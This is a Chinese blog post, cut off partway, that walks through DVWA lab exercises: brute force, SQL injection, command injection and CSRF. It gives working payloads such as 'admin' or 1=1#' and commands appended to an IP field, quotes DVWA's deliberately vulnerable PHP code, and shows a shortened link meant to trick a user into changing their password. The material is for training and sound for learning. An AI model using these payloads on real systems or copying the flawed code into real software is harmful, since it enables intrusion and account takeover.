@@ -1,0 +1,2338 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="DVWA的安装及刷题实战, 学习，IT，NLP, 机器学习">
+    <meta name="description" content="背景
+学习渗透测试，特别是 Web 渗透，最头疼的无疑就是寻找靶机环境，通常是不同的漏洞需要找不同的靶机源码。DVWA是最适合的初级环境，几年前有搭建实现过，现在重新复现一下，并记录笔记
+
+DVWA（Damn Vulnerable Web ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>DVWA的安装及刷题实战 | Justin博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Justin博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Justin博客</div>
+        <div class="logo-desc">
+            
+            ❤最爱LingJW❤
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/AlexJakin" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/AlexJakin" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        DVWA的安装及刷题实战
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" target="_blank">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-04-26
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        11.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        61 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul>
+<li><p>学习渗透测试，特别是 Web 渗透，最头疼的无疑就是寻找靶机环境，通常是不同的漏洞需要找不同的靶机源码。DVWA是最适合的初级环境，几年前有搭建实现过，现在重新复现一下，并记录笔记</p>
+</li>
+<li><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_intro.png" alt="DVWA"></p>
+<p>DVWA 一共包含了十四个攻击模块，包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。分别是：</p>
+<ol>
+<li>Brute Force（暴力（破解））</li>
+<li>Command Injection（命令行注入）</li>
+<li>CSRF（跨站请求伪造）</li>
+<li>File Inclusion（文件包含）</li>
+<li>File Upload（文件上传）</li>
+<li>Insecure CAPTCHA （不安全的验证码）</li>
+<li>SQL Injection（SQL注入）</li>
+<li>SQL Injection（Blind）（SQL盲注）</li>
+<li>Weak Session IDs （弱会话IDs）</li>
+<li>XSS（DOM）（DOM型跨站脚本）</li>
+<li>XSS（Reflected）（反射型跨站脚本）</li>
+<li>XSS（Stored）（存储型跨站脚本）</li>
+<li>CSP Bypass（内容安全策略）</li>
+<li>JavaScript Attacks</li>
+</ol>
+</li>
+</ul>
+<h2 id="必要环境"><a href="#必要环境" class="headerlink" title="必要环境"></a>必要环境</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">phpStudy</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.dvwa.co.uk/">DVWA官网</a></li>
+</ol>
+<h2 id="实战篇"><a href="#实战篇" class="headerlink" title="实战篇"></a>实战篇</h2><p>从这里开始会进行实战，难度从low开始</p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h3 id="难度：low"><a href="#难度：low" class="headerlink" title="难度：low"></a>难度：low</h3><p><img src="http://alexjakin.github.io/medias/reward/dvwa_bf.png" alt="DVWA"><br>使用burpsuite爆破破解即可</p>
+<p>这里提供github开源的字典库：<a target="_blank" rel="noopener" href="https://github.com/3had0w/Fuzzing-Dicts">https://github.com/3had0w/Fuzzing-Dicts</a></p>
+<p>并且low难度没有对特殊字符进行转义，可以使用sql注入</p>
+<blockquote>
+<p>输入：admin’ or 1=1#</p>
+</blockquote>
+<p>通过low难度代码审计，可以发现以下问题：</p>
+<ol>
+<li>登录验证仅仅只校验账号是否存在数据库，并做任何限制</li>
+<li>也没有对字符串转义，存在sql注入</li>
+</ol>
+<pre><code>if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;
+    // Get username
+    $user = $_GET[ &#39;username&#39; ];
+    // Get password
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = md5( $pass );
+    // Check the database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
+        // Login successful
+        $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;
+        $html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;
+    &#125;
+    else &#123;
+        // Login failed
+        $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+</code></pre><h3 id="难度：medium"><a href="#难度：medium" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>因此它的爆破过程与Low难度的过程基本一样，可以参考Low难度中的爆破过程，区别是每一次登录失败后会延时2s，别的就没有什么改动了，总体过程影响不大。</p>
+<p>另外在这个Medium难度的源码中，它对防止注入做了很多的工作，像比如说，它使用了<strong>mysql_real_escape_string</strong> 函数，这个函数可以对字符串中的函数进行转义，一定程度上可以防止sql注入</p>
+<p>并且通过medium难度的代码审计，可以发现相比于low难度，有以下改进：</p>
+<ol>
+<li>使用mysqli_real_escape_string()转义字符串</li>
+<li>当登录失败时，会延迟2秒，sleep( 2 );给字典爆破时间上一定的限制</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;
+    // Sanitise username input
+    $user = $_GET[ &#39;username&#39; ];
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Sanitise password input
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
+    // Check the database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
+        // Login successful
+        $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;
+        $html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;
+    &#125;
+    else &#123;
+        // Login failed
+        sleep( 2 );
+        $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+?&gt;
+
+</code></pre><h3 id="难度：high"><a href="#难度：high" class="headerlink" title="难度：high"></a>难度：high</h3><p>这里先简单介绍一下token，token是为了减轻服务器压力，当用户登录会返回token，后面用户继续想登录只需要比对token即可</p>
+<p>爆破的过程具体分为以下几步：</p>
+<ol>
+<li>使用burpsuite抓包并发往intruder</li>
+<li>添加password和user_token两个变量</li>
+<li>注意攻击方式使用Pitchfork，每一个变量标记对应一个字典，取每个字典的对应项。</li>
+<li>变量password用simple list，变量user_token使用recursive grep。</li>
+</ol>
+<p>效果如下：</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_bp_hard.png" alt="DVWA_BP_HARD"></p>
+<p>在这个难度中，通过high代码审计可以发现，</p>
+<ol>
+<li>首先从代码中可以发现是加了token验证的。</li>
+<li>针对这种带有token验证的，我们也可以使用burpsuite去爆破。</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+    // Sanitise username input
+    $user = $_GET[ &#39;username&#39; ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Sanitise password input
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
+    // Check database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
+        // Login successful
+        $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;
+        $html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;
+    &#125;
+    else &#123;
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+// Generate Anti-CSRF token
+generateSessionToken();
+?&gt;
+
+</code></pre><h3 id="难度：impossible"><a href="#难度：impossible" class="headerlink" title="难度：impossible"></a>难度：impossible</h3><p>我的理解是impossible难度是最大可能限制攻击。像此处查看源码可知，当用户登录失败次数超过<strong>total_failed_login</strong>（dvwa设置为3），就会将账号锁住15秒。</p>
+<p>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这里因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
+<pre><code>    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  &#123;
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //$html .= &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;
+
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ &#39;last_login&#39; ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        /*
+        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;
+        */
+
+        // Check to see if enough time has passed, if it hasn&#39;t locked the account
+        if( $timenow &lt; $timeout ) &#123;
+            $account_locked = true;
+            // print &quot;The account is locked&lt;br /&gt;&quot;;
+        &#125;
+    &#125;
+</code></pre><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="难度：low-1"><a href="#难度：low-1" class="headerlink" title="难度：low"></a>难度：low</h3><blockquote>
+<p>可以把ip地址和系统信息等显示出来<br>    输入：127.0.0.1 &amp; ipconfig &amp; systeminfo</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_ci_low.png" alt="命令注入"></p>
+<h3 id="难度：medium-1"><a href="#难度：medium-1" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>该难度是对一些字符 如&amp;&amp; 进行了转义，但没有对&amp;转转义，感觉这里出得不太好，所以用上一个low难度即可。除此之外可以用分号隔绝&amp;&amp;</p>
+<blockquote>
+<p>输入：127.0.0.1 &amp;;&amp; systeminfo</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_ci_m.png" alt="命令注入"></p>
+<h3 id="难度：high-1"><a href="#难度：high-1" class="headerlink" title="难度：high"></a>难度：high</h3><p>该难度是对很多常见字符都进行了转义。只能一个个去试看看哪个还没有转义可以绕过。发现还有||还没转义。</p>
+<blockquote>
+<p>输入：127.0.0.1 || systeminfo</p>
+</blockquote>
+<h3 id="难度：impossible-1"><a href="#难度：impossible-1" class="headerlink" title="难度：impossible"></a>难度：impossible</h3><p>此处是对IP地址进行了限制，只能输入IP地址格式，不能加入其它东西。同时还设置了token</p>
+<h2 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h2><p>CSRF攻击： 跨站请求伪造。已登录用户 访问 攻击者网站，攻击网站向被攻击网站发起恶意请求（利用浏览器会自动携带cookie）。简单来讲，就是利用用户的登录状态，并通过第三方站点做一些事情</p>
+<h3 id="难度：low-2"><a href="#难度：low-2" class="headerlink" title="难度：low"></a>难度：low</h3><p>先抓包分析，是get请求。在浏览器地址栏可以也可以看得到请求地址。</p>
+<p>使用短连接生成器：<a target="_blank" rel="noopener" href="https://suolink.cn/?from=3205">https://suolink.cn/?from=3205</a></p>
+<p>利用该链接<strong><a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/csrf/?password_new=12&amp;password_conf=12&amp;Change=Change#">http://192.168.113.1/dvwa/vulnerabilities/csrf/?password_new=12&amp;password_conf=12&amp;Change=Change#</a></strong>，生成：<strong><a target="_blank" rel="noopener" href="http://c.nxw.so/6SdyY">http://c.nxw.so/6SdyY</a></strong>，然后只需要想办法让用户去诱导点开这个地址即可</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_csrf_low_data.png" alt="CSRF"></p>
+<p>通过low难度代码审计可以发现以下信息：</p>
+<ol>
+<li>仅判断$pass_new和$pass_conf是否相同</li>
+<li>使用mysqli_real_escape_string防止注入</li>
+<li>这里没有对refer做判断，所以就会导致crsf漏洞</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;
+    // Get input
+    $pass_new  = $_GET[ &#39;password_new&#39; ];
+    $pass_conf = $_GET[ &#39;password_conf&#39; ];
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) &#123;
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+        // Feedback for the user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    &#125;
+    else &#123;
+        // Issue with passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+?&gt;
+
+</code></pre><h3 id="难度：medium-2"><a href="#难度：medium-2" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>链接提交没有refer，通过代码审计可以发现：medium难度通过$_SERVER[‘HTTP_REFERER’]获取当前链接的上一个连接来源地址。但是medium难度只是单单做是否存在refer的判断，对于直接用链接访问，我们只需要抓包加一个refer再发送出去即可</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_csrf_md.png" alt="CSRF"></p>
+<p>加了refer后效果：<br><img src="http://alexjakin.github.io/medias/reward/dvwa_csrf_md_res.png" alt="CSRF"></p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;
+    // Checks to see where the request came from
+    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) &#123;
+        // Get input
+        $pass_new  = $_GET[ &#39;password_new&#39; ];
+        $pass_conf = $_GET[ &#39;password_conf&#39; ];
+        // Do the passwords match?
+        if( $pass_new == $pass_conf ) &#123;
+            // They do!
+            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+            $pass_new = md5( $pass_new );
+            // Update the database
+            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
